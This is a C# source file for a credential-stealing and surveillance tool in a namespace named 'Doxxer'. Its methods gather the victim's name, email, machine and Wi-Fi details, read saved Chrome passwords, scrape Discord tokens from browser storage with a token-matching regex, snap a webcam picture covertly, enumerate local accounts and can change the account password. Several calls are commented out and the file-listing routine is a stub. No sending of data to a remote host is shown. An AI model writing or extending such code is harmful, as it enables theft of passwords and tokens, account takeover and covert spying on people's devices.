using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Security.Permissions;
using System.Text.RegularExpressions;
using Emgu.CV;
using Microsoft.Win32;
using SimpleWifi;

namespace Doxxer
{
    public class GatherData
    {
        public GatherData()
        {
            getAllFilePaths();
            // Console.Write(getFullName() + "\n");
            // Console.Write(getUserEmail() + "\n");
            // Console.Write(getComputerName() + "\n");
            // Console.Write(getConnectedWifi().Name + "\n");
            // Console.Write(GetWifi() + "\n");
            // Console.Write(GetSystemDefaultBrowser() + "\n\n");
            // foreach (var token in GetTokens())
            // {
            //     Console.Write(token +  "\n");
            // }
            //getPasswordsFromBrowser("chrome");
            //takeWebCamPicture();
            //getAccounts();
        }

        private string GetWifi()
        {
            var wifiProcess = new Process();
            wifiProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            wifiProcess.StartInfo.FileName = "netsh";
            wifiProcess.StartInfo.Arguments = "wlan show profile";
            wifiProcess.StartInfo.UseShellExecute = false;
            wifiProcess.StartInfo.RedirectStandardError = true;
            wifiProcess.StartInfo.RedirectStandardInput = true;
            wifiProcess.StartInfo.RedirectStandardOutput = true;
            wifiProcess.StartInfo.CreateNoWindow = true;
            wifiProcess.Start();
            var output = wifiProcess.StandardOutput.ReadToEnd();
            wifiProcess.WaitForExit();
            return output;
        }

        private AccessPoint getConnectedWifi()
        {
            var wifi = new Wifi();
            foreach (var connection in wifi.GetAccessPoints())
            {
                if (connection.IsConnected)
                {
                    return connection;
                }
            }

            return null;
        }

        private string getComputerName()
        {
            return Environment.MachineName;
        }

        private Version getRuntimeVersion()
        {
            return Environment.Version;
        }

        private OperatingSystem getOSVersion()
        {
            return Environment.OSVersion;
        }

        private string getDirectory()
        {
            return Environment.SystemDirectory;
        }

        private string getUserEmail()
        {
            return UserPrincipal.Current.EmailAddress;
        }

        private string getFullName()
        {
            return UserPrincipal.Current.DisplayName;
        }

        private void setAccountPassword(String newPassword)
        {
            UserPrincipal.Current.SetPassword(newPassword);
        }

        private void unlockAccount()
        {
            UserPrincipal.Current.UnlockAccount();
        }

        private void getAccounts()
        {
            var path =
                string.Format("WinNT://{0},computer", Environment.MachineName);

            using (var computerEntry = new DirectoryEntry(path))
                foreach (DirectoryEntry childEntry in computerEntry.Children)
                    if (childEntry.SchemaClassName == "User")
                        Console.Write(childEntry.Name + "\n");
        }

        private void takeWebCamPicture()
        {
            var capture = new VideoCapture();
            if (capture.QueryFrame() != null && capture.IsOpened)
            {
                var image = capture.QueryFrame().ToBitmap();
                image.Save("webcam.png");
            }
        }

        private string GetSystemDefaultBrowser()
        {
            string name = string.Empty;
            RegistryKey regKey = null;

            try
            {
                var regDefault = Registry.CurrentUser.OpenSubKey(
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.htm\\UserChoice", false);
                var stringDefault = regDefault.GetValue("ProgId");

                regKey = Registry.ClassesRoot.OpenSubKey(stringDefault + "\\shell\\open\\command", false);
                name = regKey.GetValue(null).ToString().ToLower().Replace("" + (char)34, "");

                if (!name.EndsWith("exe"))
                    name = name.Substring(0, name.LastIndexOf(".exe") + 4);
            }
            catch (Exception ex)
            {
                name = string.Format(
                    "ERROR: An exception of type: {0} occurred in method: {1} in the following module: {2}",
                    ex.GetType(), ex.TargetSite, GetType());
            }
            finally
            {
                if (regKey != null)
                    regKey.Close();
            }

            return name;
        }

        private void getPasswordsFromBrowser(String browser)
        {
            var passwords = new ChromePassReader().ReadPasswords(browser);
            foreach (var password in passwords)
            {
                Console.Write(password.Url + ": " + password.Username + ": " + password.Password + "\n");
            }
        }
        private List<string> GetTokens()
        {
            var paths = new Dictionary<string, string>();
            var tokens = new List<string>();

            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            
            paths.Add("Discord", roaming + "\\discord");
            paths.Add("Discord Canary", roaming + "\\discordcanary");
            paths.Add("Discord PTB", roaming + "\\discordptb");
            paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");

            foreach (KeyValuePair<string, string> kvp in paths)
            {
                string platform = kvp.Key;
                string path = kvp.Value;
                
                if (Directory.Exists(path))
                {
                    foreach (string token in FindTokens(path))
                    {
                        tokens.Add($"{platform}: {token}");
                    }
                }
            }
            return tokens;
        }

        private List<string> FindTokens(string path)
        {
            path += "\\Local Storage\\leveldb";
            var tokens = new List<string>();

            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string content = File.ReadAllText(file);

                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                {
                    tokens.Add(match.ToString());
                }
            }
            return tokens;
        }

        private void getAllFilePaths()
        {
            HashSet<string> filePaths = new HashSet<string>();
            foreach (var drive in DriveInfo.GetDrives())
            {
                var paths = Traverse(@"Directory path");
            }
        }
        
        private IEnumerable<string> Traverse(string rootDirectory)
        {
            IEnumerable<string> files = Enumerable.Empty<string>();
            IEnumerable<string> directories = Enumerable.Empty<string>();
            try
            {
                // The test for UnauthorizedAccessException.
                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
                permission.Demand();

                files = Directory.GetFiles(rootDirectory);
                directories = Directory.GetDirectories(rootDirectory);
            }
            catch
            {
                // Ignore folder (access denied).
                rootDirectory = null;
            }

            if (rootDirectory != null)
                yield return rootDirectory;

            foreach (var file in files)
            {
                yield return file;
            }

            // Recursive call for SelectMany.
            var subdirectoryItems = directories.SelectMany(Traverse);
            foreach (var result in subdirectoryItems)
            {
                yield return result;
            }
        }

    }
}